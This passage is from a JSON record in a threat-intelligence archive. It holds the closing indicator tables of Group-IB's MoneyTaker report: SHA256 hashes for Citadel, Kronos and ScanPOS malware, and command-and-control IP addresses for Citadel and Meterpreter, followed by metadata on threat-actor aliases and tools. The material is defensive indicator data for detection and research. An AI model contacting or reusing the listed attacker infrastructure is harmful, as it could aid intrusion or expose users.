cb36cf40ec660e3ee10e76834340bf1234186315ca808|\n|RAVBg64.vbs|a3da7fd3dd3c12f6b0f3ce7d96906e8fcdcc0817a546777a5b37b9b1d1ec954d|\n|se.vbs|ff999c968bce81987cab47a02a3b176042489d82644d4c6fb13d5c8c1244cbcc|\n\n\n-----\n\n1.5 YEARS OF SILENT OPERATIONS 35\n\nCitadel\n\nFile name SHA256 Description\n\nc4c.exe c7d20b726708a441db3d864457a097833654719513990f823b1deb7c48b65472 Citadel\n\nfce2857010e1.exe b75d28deeaece776fc09dbc0cd351adab1ed80ef4245f7681d4a57e47fa83fb7 Citadel\n\ncbcs.exe e01e9cdfff085393362e1e2e3ec8cae33c536053760e65c7617d5a0dfd005874 Citadel Backconnect Server\n\nKronos\n\nFile name SHA256\n\n203.exe 536fc552cc24733f05f5a3be333c030fc848060da978b282d67d67a7c76c0d30\n\nScanPOS\n\nFile name SHA256\n\na8b05325.exe 093c81f0b234c2aa0363129fdaaaf57551f161915da3d23f43a792b5f3024c1e\n\nIP Addresses\n\n|File name|SHA256|Description|\n|---|---|---|\n|c4c.exe|c7d20b726708a441db3d864457a097833654719513990f823b1deb7c48b65472|Citadel|\n|fce2857010e1.exe|b75d28deeaece776fc09dbc0cd351adab1ed80ef4245f7681d4a57e47fa83fb7|Citadel|\n|cbcs.exe|e01e9cdfff085393362e1e2e3ec8cae33c536053760e65c7617d5a0dfd005874|Citadel Backconnect Server|\n\n|File name|SHA256|\n|---|---|\n|203.exe|536fc552cc24733f05f5a3be333c030fc848060da978b282d67d67a7c76c0d30|\n\n|File name|SHA256|\n|---|---|\n|a8b05325.exe|093c81f0b234c2aa0363129fdaaaf57551f161915da3d23f43a792b5f3024c1e|\n\n|IP Addresses|Malware|ISP|Country|\n|---|---|---|---|\n|46.45.171.174|ScanPOS|Sayfa Net|Turkey|\n|46.45.171.174|Kronos|Sayfa Net|Turkey|\n|188.120.235.201|Citadel|ISPsystem|Russia|\n|82.146.54.5|Citadel|ISPsystem|Russia|\n|82.146.54.5|Meterpreter|ISPsystem|Russia|\n|83.220.172.71|Meterpreter|ISPsystem|Russia|\n|37.46.133.190|Meterpreter|ISPsystem|Russia|\n|172.86.121.11|Meterpreter|Router Hosting|USA|\n|146.185.243.19|Meterpreter|Just Hosting|Russia|\n|188.120.235.201|Meterpreter|ISPsystem|Russia|\n|188.120.230.218|Meterpreter|ISPsystem|Russia|\n|188.120.230.235|Meterpreter|ISPsystem|Russia|\n|185.141.25.222|Meterpreter|HostSailor|Romania|\n|185.141.25.81|Meterpreter|HostSailor|Romania|\n|185.86.149.140|Meterpreter|Virtual Server hosting|Latvia|\n|212.117.180.238|Meterpreter|root S.A.|Luxembourg|\n|155.94.238.15|Meterpreter|HostBrew, LLC|USA|\n\n\n-----\n\n## Preventing and investigating cybercrime since 2003\n\n###### www.group-ib.com info@group-ib.com twitter.com/groupib_gib blog.group-ib.com +44 2036085907 linkedin.com/organization/1382013\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "5d2b9e7f-cf43-4b54-ba18-065aa3003611",
            "created_at": "2022-10-25T16:06:24.199525Z",
            "updated_at": "2022-10-25T16:06:24.199525Z",
            "deleted_at": null,
            "name": "CyberMonitor",
            "url": "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections",
            "description": "APT & Cybercriminals Campaign Collection",
            "reports": null
        }
    ],
    "references": [
        "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections/raw/master/2017/2017.12.11.MoneyTaker/Group-IB_MoneyTaker_report.pdf"
    ],
    "report_names": [
        "Group-IB_MoneyTaker_report"
    ],
    "threat_actors": [
        {
            "id": "8e1bae2f-2a21-4ba8-a6f1-42155f96aec8",
            "created_at": "2022-10-25T16:07:23.645758Z",
            "updated_at": "2025-03-27T02:02:09.905135Z",
            "deleted_at": null,
            "main_name": "Flying Kitten",
            "aliases": [
                "Ajax Security Team",
                "Flying Kitten",
                "Group 26",
                "Operation Saffron Rose"
            ],
            "source_name": "ETDA:Flying Kitten",
            "tools": [
                "Stealer"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "746214d4-5d48-4644-b763-8e9a9c549c04",
            "created_at": "2022-10-25T16:07:23.878029Z",
            "updated_at": "2025-03-27T02:02:10.006583Z",
            "deleted_at": null,
            "main_name": "MoneyTaker",
            "aliases": [],
            "source_name": "ETDA:MoneyTaker",
            "tools": [
                "Kronos",
                "Metasploit",
                "MoneyTaker",
                "Screenshotter"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "610a7295-3139-4f34-8cec-b3da40add480",
            "created_at": "2023-01-06T13:46:38.608142Z",
            "updated_at": "2025-03-27T02:00:02.87217Z",
            "deleted_at": null,
            "main_name": "Cobalt",
            "aliases": [
                "Cobalt Gang",
                "GOLD KINGSWOOD",
                "COBALT SPIDER",
                "G0080",
                "Mule Libra",
                "Cobalt Group"
            ],
            "source_name": "MISPGALAXY:Cobalt",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "f4d7cba1-dbdd-42a9-88c5-4d0c81659ee0",
            "created_at": "2023-01-06T13:46:38.357581Z",
            "updated_at": "2025-03-27T02:00:02.813318Z",
            "deleted_at": null,
            "main_name": "Flying Kitten",
            "aliases": [
                "Saffron Rose",
                "AjaxSecurityTeam",
                "Ajax Security Team",
                "Group 26",
                "Sayad",
                "SaffronRose"
            ],
            "source_name": "MISPGALAXY:Flying Kitten",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "e5364c16-eb97-467e-a8c2-a720269498c1",
            "created_at": "2023-01-06T13:46:38.733469Z",
            "updated_at": "2025-03-27T02:00:02.904201Z",
            "deleted_at": null,
            "main_name": "MoneyTaker",
            "aliases": [],
            "source_name": "MISPGALAXY:MoneyTaker",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "cf7fc640-acfe-41c4-9f3d-5515d53a3ffb",
            "created_at": "2023-01-06T13:46:38.228042Z",
            "updated_at": "2025-03-27T02:00:02.775905Z",
            "deleted_at": null,
            "main_name": "APT1",
            "aliases": [
                "GIF89a",
                "G0006",
                "PLA Unit 61398",
                "Group 3",
                "TG-8223",
                "Comment Group",
                "ShadyRAT",
                "COMMENT PANDA",
                "Comment Crew",
                "Byzantine Candor",
                "Brown Fox"
            ],
            "source_name": "MISPGALAXY:APT1",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "3aaf0755-5c9b-4612-9f0e-e266ef1bdb4b",
            "created_at": "2022-10-25T16:07:23.480196Z",
            "updated_at": "2025-03-27T02:02:09.826059Z",
            "deleted_at": null,
            "main_name": "Comment Crew",
            "aliases": [
                "APT 1",
                "BrownFox",
                "Byzantine Candor",
                "Byzantine Hades",
                "Comment Crew",
                "Comment Panda",
                "GIF89a",
                "Group 3",
                "Operation Oceansalt",
                "Operation Seasalt",
                "Operation Siesta",
                "Shanghai Group",
                "TG-8223"
            ],
            "source_name": "ETDA:Comment Crew",
            "tools": [
                "Auriga",
                "Cachedump",
                "Chymine",
                "CookieBag",
                "Darkmoon",
                "GDOCUPLOAD",
                "GLOOXMAIL",
                "GREENCAT",
                "Gen:Trojan.Heur.PT",
                "GetMail",
                "Hackfase",
                "Hacksfase",
                "Helauto",
                "Kurton",
                "LETSGO",
                "LIGHTBOLT",
                "LIGHTDART",
                "LOLBAS",
                "LOLBins",
                "LONGRUN",
                "Living off the Land",
                "Lslsass",
                "MAPIget",
                "ManItsMe",
                "Mimikatz",
                "MiniASP",
                "Oceansalt",
                "Pass-The-Hash Toolkit",
                "Poison Ivy",
                "ProcDump",
                "Riodrv",
                "SPIVY",
                "Seasalt",
                "ShadyRAT",
                "StarsyPound",
                "TROJAN.COOKIES",
                "TROJAN.FOXY",
                "TabMsgSQL",
                "Tarsip",
                "Trojan.GTALK",
                "WebC2",
                "WebC2-AdSpace",
                "WebC2-Ausov",
                "WebC2-Bolid",
                "WebC2-Cson",
                "WebC2-DIV",
                "WebC2-GreenCat",
                "WebC2-Head",
                "WebC2-Kt3",
                "WebC2-Qbp",
                "WebC2-Rave",
                "WebC2-Table",
                "WebC2-UGX",
                "WebC2-Yahoo",
                "Wordpress Bruteforcer",
                "bangat",
                "gsecdump",
                "pivy",
                "poisonivy",
                "pwdump",
                "zxdosml"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1666716497,
    "ts_updated_at": 1743041399,
    "ts_creation_date": 1513011519,
    "ts_modification_date": 1513011526,
    "files": {
        "pdf": "https://archive.orkl.eu/7a57e05aab003604657afa1bb06af954004215c7.pdf",
        "text": "https://archive.orkl.eu/7a57e05aab003604657afa1bb06af954004215c7.txt",
        "img": "https://archive.orkl.eu/7a57e05aab003604657afa1bb06af954004215c7.jpg"
    }
}